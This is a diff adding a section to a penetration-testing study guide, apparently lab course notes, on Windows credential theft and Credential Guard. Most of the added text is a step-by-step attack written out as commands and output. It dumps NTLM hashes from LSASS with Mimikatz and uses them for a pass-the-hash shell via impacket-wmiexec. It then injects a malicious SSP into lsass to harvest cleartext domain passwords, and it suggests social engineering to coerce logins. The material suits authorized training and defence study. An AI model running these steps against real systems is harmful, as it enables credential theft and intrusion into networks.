@@ -548,3 +548,175 @@ exit
 ---
 
 This markdown conversion preserves all the original content while making it more readable and organized with proper headings, code blocks, and formatting. The technical commands and procedures are clearly delineated, making it easier to follow the various penetration testing techniques described in the document.
+
+## Windows Credential Guard
+
+Up to this point we have dealt with hashes that belonged to local accounts. However, we may encounter other types of accounts, including Windows domain accounts.
+
+Let's start by using Mimikatz (located at C:\tools\mimikatz\mimikatz.exe) to obtain hashes for a domain user. In order to obtain hashes from a domain user, we'll need to log in to a system using domain credentials. Let's RDP into CLIENTWK246 as the CORP\Administrator user with the QWERTY!@# password.
+   ```bash
+   xfreerdp /u:"CORP\\Administrator" /p:"QWERTY123\!@#" /v:192.168.50.246 /dynamic-resolution
+   ```
+
+With the terminal open, let's navigate to C:\tools\mimikatz\ folder and run mimikatz.exe.
+   ```pwsh
+   PS C:\Users\offsec> cd C:\tools\mimikatz\
+   PS C:\tools\mimikatz> .\mimikatz.exe
+   
+     .#####.   mimikatz 2.2.0 (x64) #19041 Oct 20 2023 07:20:39
+    .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+    ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+    ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+    '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+     '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+   
+   mimikatz # privilege::debug
+   Privilege '20' OK
+   
+   mimikatz # sekurlsa::logonpasswords
+   
+   Authentication Id : 0 ; 5795018 (00000000:00586cca)
+   Session           : RemoteInteractive from 6
+   User Name         : offsec
+   Domain            : CLIENTWK246
+   Logon Server      : CLIENTWK246
+   Logon Time        : 9/19/2024 2:08:43 AM
+   SID               : S-1-5-21-180219712-1214652076-1814130762-1002
+           msv :
+            [00000003] Primary
+            * Username : offsec
+            * Domain   : CLIENTWK246
+            * NTLM     : 2892d26cdf84d7a70e2eb3b9f05c425e
+            * SHA1     : a188967ac5edb88eca3301f93f756ca8e94013a3
+            * DPAPI    : a188967ac5edb88eca3301f93f756ca8
+           tspkg :
+           wdigest :       KO
+           kerberos :
+            * Username : offsec
+            * Domain   : CLIENTWK246
+            * Password : (null)
+           ssp :
+           credman :
+           cloudap :
+   ...
+   Authentication Id : 0 ; 5468350 (00000000:005370be)
+   Session           : RemoteInteractive from 5
+   User Name         : Administrator
+   Domain            : CORP
+   Logon Server      : SERVERWK248
+   Logon Time        : 9/19/2024 2:08:28 AM
+   SID               : S-1-5-21-1711441587-1152167230-1972296030-500
+           msv :
+            [00000003] Primary
+            * Username : Administrator
+            * Domain   : CORP
+            * NTLM     : 160c0b16dd0ee77e7c494e38252f7ddf
+            * SHA1     : 2b26e304f13c21b8feca7dcedb5bd480464f73b4
+            * DPAPI    : 8218a675635dab5b43dca6ba9df6fb7e
+           tspkg :
+           wdigest :       KO
+           kerberos :
+            * Username : Administrator
+            * Domain   : CORP.COM
+            * Password : (null)
+           ssp :
+           credman :
+           cloudap :
+   ```
+
+This output shows that we obtained the local offsec user's credential information as expected. However, we also gained access to the Administrator user's information from the CORP.COM domain.
+
+Using this information, we can implement a pass-the-hash attack and gain access to the SERVERWK248 (192.168.50.248) machine.
+   ```bash
+   kali@kali:~$ impacket-wmiexec -debug -hashes 00000000000000000000000000000000:160c0b16dd0ee77e7c494e38252f7ddf CORP/Administrator@192.168.50.248
+   Impacket v0.12.0.dev1 - Copyright 2023 Fortra
+   
+   [+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
+   [*] SMBv3.0 dialect used
+   [+] Target system is 192.168.50.248 and isFQDN is False
+   [+] StringBinding: SERVERWK248[64285]
+   [+] StringBinding: 192.168.50.248[64285]
+   [+] StringBinding chosen: ncacn_ip_tcp:192.168.50.248[64285]
+   [!] Launching semi-interactive shell - Careful what you execute
+   [!] Press help for extra shell commands
+   C:\>
+   ```
+
+## HASH Exploit Mitigations
+
+Virtualization-based Security (VBS) is a software technology which takes advantage of the hardware virtualization features that modern CPUs provide. VBS runs a hypervisor on the physical hardware rather than running on the operating system. Specifically, VBS is implemented through Hyper-V, Microsoft's native hypervisor. In addition, Microsoft built the Virtual Secure Mode (VSM).
+
+VSM creates isolated regions in memory where the operating system can store highly-sensitive information and system security assets. VSM maintains this isolation through what is known as Virtual Trust Levels (VTLs). Each VTL represents a separate isolated memory region and currently Microsoft supports up to 16 levels, ranked from least privileged, VTL0, to VTL1, with VTL1 having more privileges than VTL0 and so on. As of the writing of this module Windows uses two VTLs:
+
+   VTL0 (VSM Normal Mode): Contains the Windows environment that hosts regular user-mode processes as well as a normal kernel (nt) and kernel-mode data.
+   VTL1 (VSM Secure Mode): Contains an isolated Windows environment used for critical functionalities.
+
+In this Module, we'll focus on Credential Guard mitigation. When enabled, the Local Security Authority (LSASS) environment runs as a trustlet in VTL1 named LSAISO.exe (LSA Isolated) and communicates with the LSASS.exe process running in VTL0 through an RCP channel.
+   ```bash
+   xfreerdp /u:"CORP\\Administrator" /p:"QWERTY123\!@#" /v:192.168.50.245 /dynamic-resolution
+   ```
+
+To start off we want to confirm that Credential Guard is running on our machine. We can do this through the Get-ComputerInfo powershell cmdlet.
+   ```pwsh
+   PS C:\Users\offsec> Get-ComputerInfo
+
+   WindowsBuildLabEx                                       : 22621.1.amd64fre.ni_release.220506-1250
+   WindowsCurrentVersion                                   : 6.3
+   WindowsEditionId                                        : Enterprise
+   ...
+   HyperVisorPresent                                       : True
+   HyperVRequirementDataExecutionPreventionAvailable       :
+   HyperVRequirementSecondLevelAddressTranslation          :
+   HyperVRequirementVirtualizationFirmwareEnabled          :
+   HyperVRequirementVMMonitorModeExtensions                :
+   DeviceGuardSmartStatus                                  : Off
+   DeviceGuardRequiredSecurityProperties                   : {BaseVirtualizationSupport, SecureBoot}
+   DeviceGuardAvailableSecurityProperties                  : {BaseVirtualizationSupport, SecureBoot, DMAProtection, SecureMemoryOverwrite...}
+   DeviceGuardSecurityServicesConfigured                   : {CredentialGuard, HypervisorEnforcedCodeIntegrity, 3}
+   DeviceGuardSecurityServicesRunning                      : {CredentialGuard, HypervisorEnforcedCodeIntegrity}
+   DeviceGuardCodeIntegrityPolicyEnforcementStatus         : EnforcementMode
+   DeviceGuardUserModeCodeIntegrityPolicyEnforcementStatus : AuditMode
+   ```
+
+> As we can see from the above output, one of the mitigations enabled under DeviceGuardSecurityServicesRunning is CredentialGuard.
+
+Running mimikatz on the system with credential guard shows only the local users of the system, because the LSASS process only has access to this information after it has been encrypted by the LSAISO process.
+
+Microsoft provides quite a few authentication mechanisms as part of the Windows operating system such as Local Security Authority (LSA) Authentication, Winlogon, Security Support Provider Interfaces (SSPI), etc. Specifically, SSPI is foundational as it is used by all applications and services that require authentication. For example, when two Windows computers or devices need to be authenticated in order to securely communicate, the requests made for authentication are routed to the SSPI which then handles the actual authentication.
+
+By default, Windows provides several Security Support Providers (SSP) such as Kerberos Security Support Provider, NTLM Security Support Provider, etc. these are incorporated into the SSPI as DLLs and when authentication happens the SSPI decides which one to use.
+
+What is important to know is that we can register multiple SSPs through the AddSecurityPackage API.
+
+Additionally the SSP can also be registered through the HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa\Security Packages registry key. Each time the system starts up, the Local Security Authority (lsass.exe) loads the SSP DLLs present in the list pointed to by the registry key.
+
+What this means is that if we were to develop our own SSP and register it with LSASS, we could maybe force the SSPI to use our malicious Security Support Provider DLL for authentication.
+
+Fortunately, Mimikatz already supports this through the memssp, which not only provides the required Security Support Provider (SSP) functionality but injects it directly into the memory of the lsass.exe process without dropping any DLLs on disk.
+
+```bash
+mimikatz # privilege::debug
+Privilege '20' OK
+
+mimikatz # misc::memssp
+Injected =)
+```
+
+At this point, we have two options, we can either be patient and wait for another user to remotely connect to the machine or we can resort to additional techniques such as social engineering to coerce someone to log in.
+
+When injecting a SSP into LSASS using Mimikatz, the credentials will be saved in a log file, C:\Windows\System32\mimilsa.log.
+   ```pwsh
+   PS C:\Users\offsec> type C:\Windows\System32\mimilsa.log
+   [00000000:00aeb773] CORP\CLIENTWK245$   R3;^LTW*0g4o%bQo1M[L=OCDDR>%$ >n*>&8?!5oz$mY%HV%gm=X&J6,w(FV[KL?*g2HbL.@p(s&mC?Nz*N;DVtP+G]imZ_6MBkb:#Wq&8eo/fU@eBq+;CXt
+   [00000000:00aebd86] CORP\CLIENTWK245$   R3;^LTW*0g4o%bQo1M[L=OCDDR>%$ >n*>&8?!5oz$mY%HV%gm=X&J6,w(FV[KL?*g2HbL.@p(s&mC?Nz*N;DVtP+G]imZ_6MBkb:#Wq&8eo/fU@eBq+;CXt
+   [00000000:00aebf6f] CORP\CLIENTWK245$   R3;^LTW*0g4o%bQo1M[L=OCDDR>%$ >n*>&8?!5oz$mY%HV%gm=X&J6,w(FV[KL?*g2HbL.@p(s&mC?Nz*N;DVtP+G]imZ_6MBkb:#Wq&8eo/fU@eBq+;CXt
+   [00000000:00af2311] CORP\Administrator  QWERTY123!@#
+   [00000000:00404e84] CORP\Administrator  Šd
+   [00000000:00b16d69] CORP\CLIENTWK245$   R3;^LTW*0g4o%bQo1M[L=OCDDR>%$ >n*>&8?!5oz$mY%HV%gm=X&J6,w(FV[KL?*g2HbL.@p(s&mC?Nz*N;DVtP+G]imZ_6MBkb:#Wq&8eo/fU@eBq+;CXt
+   [00000000:00b174fa] CORP\CLIENTWK245$   R3;^LTW*0g4o%bQo1M[L=OCDDR>%$ >n*>&8?!5oz$mY%HV%gm=X&J6,w(FV[KL?*g2HbL.@p(s&mC?Nz*N;DVtP+G]imZ_6MBkb:#Wq&8eo/fU@eBq+;CXt
+   [00000000:00b177a7] CORP\CLIENTWK245$   R3;^LTW*0g4o%bQo1M[L=OCDDR>%$ >n*>&8?!5oz$mY%HV%gm=X&J6,w(FV[KL?*g2HbL.@p(s&mC?Nz*N;DVtP+G]imZ_6MBkb:#Wq&8eo/fU@eBq+;CXt
+   [00000000:00b1dd77] CLIENTWK245\offsec  lab
+   [00000000:00b1de21] CLIENTWK245\offsec  lab
+   ```
+
+
